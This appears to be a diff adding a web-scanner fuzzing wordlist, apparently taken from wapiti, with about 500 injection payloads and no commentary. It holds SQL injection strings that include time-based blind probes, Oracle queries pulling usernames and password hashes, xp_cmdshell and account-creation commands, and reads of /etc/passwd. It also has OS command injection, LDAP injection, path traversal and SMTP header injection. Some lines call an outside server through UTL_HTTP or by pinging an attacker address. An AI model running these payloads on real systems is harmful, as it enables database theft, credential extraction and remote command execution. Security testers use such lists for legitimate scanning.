@@ -1,0 +1,501 @@
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+' or 3=3
+')%20waitfor%20delay%20'0:0:20'%20--
+" waitfor delay '0:0:20' /*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+y ' or 5 > 6
+having
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+PRINT @@variable
+limit
+" or 'W'='W' --
+' select name from syscolumns where id = (select id from sysobjects where name = tablename')--
+);waitfor delay '0:0:__TIME__'--
+@variable
+(
+%21
+'),NULL)%20waifor%20delay%20'0:0:20'%20/*
+9999"+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)+"9999
+tz_offset
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+pwd
+|nid\n
+$%26%26dir+c:%255c
+(substring(version(),1,1)=5)
+1' and non_existant_table = '1
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'
+or%201=1 --
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+a' waitfor delay '0:0:10'--
+*(|(objectclass=*))
+1
+!
+)))) waitfor delay '0:0:20' /*
+%26
+select current_setting('log_connections');
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+select
+or 0=0 --
+%0Aid
+;system('cat%20/etc/passwd')
+@*
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+1 or 1 in (@@version)--
+' or 2 > 1
+' or (EXISTS)
+a);id
+"))) and 0=benchmark(3000000,MD5(1))%20--
+xsstest
+' or 'unusual' = 'unusual'
+exec sp
+x' AND userid IS NULL; --
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i
+" or 4479=4479--
+")) or pg_sleep(__TIME__)--
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+or 4479=4479
+2+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual)
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i
+/
+//*
+asc
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+select * from syscat.dbauth where grantee = current user;
+1) or sleep(__TIME__)#
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i
+) waitfor delay '0:0:20' /*
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+)) waitfor delay '0:0:20' /*
+y ' or 4 > 7
+exec master..xp_cmdshell 'ipconfig+/all'
+" or ''qwer''=''qwer''--
+%28
+')) waitfor delay '0:0:20' /*
+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6) as test
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+))))) waitfor delay '0:0:20' --
+' or pg_sleep(__TIME__)--
+') waitfor delay '0:0:20' --
+0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+9999' or benchmark(15000000,md5(0x4e446b6e)) or '0'='9999
+' union (select NULL, NULL, NULL,  (select @@version)) --
+procedure
+))) and 0=benchmark(3000000,MD5(1))%20%23
+1 or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or 1=1
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+%27%20or%201=1
+'||Utl_Http.request('http://<yourservername>') from dual--
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i
+",NULL)%20waitfor%20delay%20'0:0:20'%20/*
+9999'||(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||'9999
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3))/*°ØXOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))OR°Ø|°±XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))OR°±*/
+' or 4479=4479
+| ping -n 30 127.0.0.1 |
+a);id;
+//
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"a"" or 3=3--"
+))%20waitfor%20delay%20'0:0:20'%20--
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+to_timestamp_tz
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+')) and 0=benchmark(3000000,MD5(1))%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'OR '' = '	Allows authentication without a valid username.
+' or 1 in (select @@version)--
+'sqlattempt1
+or isNULL(1/0) /*
+' or 4479=4479--
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i
+')))))) waitfor delay '0:0:20' --
+`/usr/bin/id`
+%27%20or%201=1
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i
+a' or 3=3--
+'sqlvuln
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+1 or 1=1--
+'%20or%20'x'='x
+') and 0=benchmark(3000000,MD5(1))%20/*
+' or 'text' > 't'
+PRINT
+or 4479=4479 #"
+(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)
+1 waitfor delay '0:0:10'--
+'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --
+1 uni/**/on select all from where
+%0a+dir+c:%255c
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+bfilename
+) and 0=benchmark(3000000,MD5(1))%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+& id
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+23 OR 1=1
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+))) and 0=benchmark(3000000,MD5(1))%20--
+(select 99999999 from pg_sleep(15)) as test
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i
+' union (select @@version) --
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+exec master..xp_cmdshell 'ping+<attackerip>'
+) or (a=a
+&
+' union all select @@version--
+\x27UNION SELECT
+'hi' or 'x'='x';
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+y ' or 4 > 1
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+' or 1=1 or ''='
+%20or%20x=x
+) waitfor delay '0:0:20' --
+)%20waitfor%20delay%20'0:0:20'%20--
+1||Utl_Http.request('http://<yourservername>') from dual--
+)))) and 0=benchmark(3000000,MD5(1))%20/*
+</foo>
+or ''qwer''=''qwer'' or ""=
+order by
+to_timestamp_tz
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'exec sp_addlogin 'name' , 'password' --
++|+Dir+c:%255c
+' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+' union+select+UTL_INADDR.get_host_address,null,null,null,null+from+dual√ø
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i
+; or '4479'='4479'
+response.write 111111
+declare @s varchar(22) select @s =
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+hi or 1=1 --"
+'))) and 0=benchmark(3000000,MD5(1))%20--
+))))))))))
+' union select 1,2,3,x,x,x,x,@@version,x√ø
+||/usr/bin/id|
+' UNION SELECT
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
+' union (select NULL, (select @@version)) --
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i
+'),NULL)%20waitfor%20delay%20'0:0:20'%20--
+1)) or pg_sleep(__TIME__)--
+"))) and 0=benchmark(3000000,MD5(1))%20%23
+select current_setting('port');
+') or sleep(__TIME__)='
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
+' or 0=0 --
+' or ''qwer''=''qwer'' --
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+:response.write 111111
+' or 'W'='W' --
+9999" or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or "0"="9999
+) union select * from information_schema.tables;
+'create user name identified by 'pass123' --
+select name from sysibm.systables;
+' or ''qwer''=''qwer''--
+`ping 127.0.0.1`
+a;id
+$+|+Dir+c:%2f
+?'
+select current_setting('port');
+") and 0=benchmark(3000000,MD5(1))%20/*
+' or ''qwer''/*
+like
+%0a ping -i 30 127.0.0.1 %0a
+' or username is not NULL or username = '
+' or 1/*
+999999)) or 1=1 or ((1=1
+and 0=benchmark(3000000,MD5(1))%20--
+' or 4479=4479 --
+hi or a=a
+hi' or 1=1 --
+uname -n -s
+%2A%28%7C%28objectclass%3D%2A%29%29
+' or 4479 --'
+a);/usr/bin/id;
+") or 1=1 or ("1"="1
+*/*
+',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --
+' or ''qwer''=''qwer'' or ''='
+<>"'%;)(&+
+' or '7659'='7659
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)
+or 0=0 #
+xyz'  OR 1%253D1+--
+" or 1=1--
+%26%26+|+dir c:\
+' or 10 > 9
+'||UTL_HTTP.REQUEST
+)) and 0=benchmark(3000000,MD5(1))%20/*
+' or (EXISTS)
+as
+1 exec sp_ (or exec xp_)
+password:*/=1--
+handler
+x' or 1=1 or 'x'='y
+' or 4479=4479 #
+select version();
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+' union+select+user,null,null,null,null+from+dual√ø
+' or 3=3 --
+hi') or ('a'='a
+23 OR 1=1
+(select benchmark(15000000,md5(0x4e446b6e))-9999) as test
+order by
+;id;
+*/*
+\n/usr/bin/id;
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i
+'))))) waitfor delay '0:0:20' --
+;|/usr/bin/id|
+" and 0=benchmark(3000000,MD5(1))%20/*
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i
+9999'||(select like('abcdefg',upper(hex(randomblob(150000000)))))||'9999
+9999"||(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||"9999
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+truncate
+' union select 1,load_file('/etc/passwd'),1,1,1;
+select * from pg_shadow;
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+waitfor delay '0:0:20' --
+9999"||(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)||"9999
+or%201=1 --
+or 1=1
+' or 'whatever' in ('whatever')
+||/usr/bin/id;
+%20'sleep%2050'
+,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+) or (a=a
+or 4479=4479--
+`ping 127.0.0.1`
+'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+whoami
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i
+')) or pg_sleep(__TIME__)--
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i
+' or ''qwer'' --'
+%7C
+' --
+select * from myfile;copy myfile to /tmp/test;
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i
+select user from sysibm.sysdummy1;
+';waitfor delay '0:0:__TIME__'--
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+char%4039%41%2b%40SELECT
+as
+or
+' or username like char(37);
+%26%26+|+dir c:%2f
+char%4039%41%2b%40SELECT
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i
+<username>' OR 1=1--
+create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.asp?" select * from myfile"--
+a;/usr/bin/id
+))) and 0=benchmark(3000000,MD5(1))%20/*
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+uni/**/on sel/**/ect
+'%20or%20'x'='x
+'/**/or/**/''qwer''/**/=/**/''qwer''
+y ' or 3 > 1
+' or '4479'='4479
+'))) waitfor delay '0:0:20' /*
+' or 1=1--
+' or 1=1 or '1'='1
+yor 'a'='a' --
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'create user name identified by pass123 temporary tablespace temp default tablespace users;
+ls -la /tmp
+update
+%2A%7C
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+or a = a
+copy myfile from '/etc/passwd';
+or 0=0 #"
+')) or sleep(__TIME__)='
+replace
+select name, tbname, coltype from sysibm.syscolumns;
+"))) waitfor delay '0:0:20' /*
+select session_user;
+"))%20waitfor%20delay%20'0:0:20'%20/*
+y ' or 3=3
+' or 0=0 #
++dir+c:\+|
+' -- &password=
+1 or benchmark(10000000,MD5(1))#
+'));waitfor delay '0:0:__TIME__'--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+1 or pg_sleep(__TIME__)--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i
+or 1=1--
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+' union select
+0 or 1=1
+or 4479=4479 --
+a'
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i
+a)|id;
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+| id
+' or 2 between 2 and 5
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i
+sqlvuln;
+2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual)
+1)) or sleep(__TIME__)#
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+y or 1=1 --
+" or "a"="a
+')))))) waitfor delay '0:0:20' /*
+%26
+' or 4479=4479 or ''='
+(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) as test
+||6
+");waitfor delay '0:0:__TIME__'--
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+")))) and 0=benchmark(3000000,MD5(1))%20/*
+(select like('abcdefg',upper(hex(randomblob(150000000)))))
+9999'||(select 99999999 from pg_sleep(15))||'9999
+|
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+insert
+select * from pg_group;
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+//
+hi or 1=1 --"
+'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+' or sleep(__TIME__)#
+")) waitfor delay '0:0:20' /*
+select * from syscat.tabauth;
+')))) waitfor delay '0:0:20' /*
+a'
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+select
+(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) as test
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+select grantee from syscat.dbauth;
+|id;
+; id
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*
+"))) and 0=benchmark(3000000,MD5(1))%20/*
+" or sleep(__TIME__)="
+%0Acat%20/etc/passwd
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i
+(select 99999999 from pg_sleep(15))
++|+dir+c:%2f+|
+\nid|
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+' or '1'='1'--
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+distinct
+delete
+;waitfor delay '0:0:__TIME__'--
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+exec sp
+x' OR full_name LIKE '%Bob%
+ping -i 30 127.0.0.1
+insert
+y ' or 2 between 1 and 3
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+$+|+Dir+c:%255c
+update
+1 or 1=1
+exec master..xp_cmdshell 'net+users'
+%0a+dir+c:\
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i
+)) and 0=benchmark(3000000,MD5(1))%20--
+' and 0=benchmark(3000000,MD5(1))%20%23
+replace
+..\..\..\..\..\..\..\..\..\..\windows\win.ini
+" or 0=0 --
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+|/usr/bin/id
+1 or 1=1
+(select 99999999 from pg_sleep(15))
+" and 0=benchmark(3000000,MD5(1))%20--
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+%28
+' or '1'='1'--
+') and 0=benchmark(3000000,MD5(1))%20%23
+',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+x' or name()='username' or 'x'='y
+(sqlattempt2)
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --
+%2A%7C
+a' or 3=3--
+' or 1=1 or ''='
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+' or a=a--
+' or uid like '%
+a);id|
+(||6)
+' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i
+9999'||(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)||'9999
+" or 4479=4479 --
+exec xp
+")) and 0=benchmark(3000000,MD5(1))%20/*
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i
+(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) as test
+%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a
++|+dir+c:\+|
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+' and 0=benchmark(3000000,MD5(1))%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i
+*(|(mail=*))
+*/*
+?
+";waitfor delay '0:0:__TIME__'--
+'%20or%201=1
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+cat /etc/passwd
+') or ('a'='a
+%20$(sleep%2050)
+1;SELECT%20*
+`id`
+y ' or 2 between 2 and 5
+PRINT
+"hi"") or (""a""=""a"
+$+|+Dir+c:\
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+' or ''='
+' or 4479/*
+")) or 1=1 or (("1"="1
+# from wapiti
